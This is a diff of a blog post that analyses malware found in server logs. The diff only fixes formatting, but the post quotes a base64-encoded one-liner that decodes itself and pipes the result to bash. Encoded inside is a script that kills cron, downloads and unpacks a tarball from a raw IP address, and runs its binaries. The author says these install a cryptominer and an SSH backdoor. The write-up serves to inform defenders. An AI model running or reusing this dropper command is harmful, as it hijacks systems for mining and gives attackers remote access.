@@ -81,10 +81,11 @@ kith.com
 
 I wrote a different  post that goes into more details. But when I was viewing the logs I noticed a long string that looks like a base64 string. The base64 encoded string looked like this:
 ```ruby 
+
 cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw\">.threatstackcloudsecops; base64 --decode .threatstackcloudsecops | bash
 ```
 When ran it will download and execute a miner. But it will also add their ssh key to the ```.ssh``` directory. The malware also sets up a hidden SSH sever that allows the attckers to login. Below is the decoded base64 string.
-``ruby
+```ruby
 #!/bin/bash
 cd /tmp
 rm -rf .X15-unix
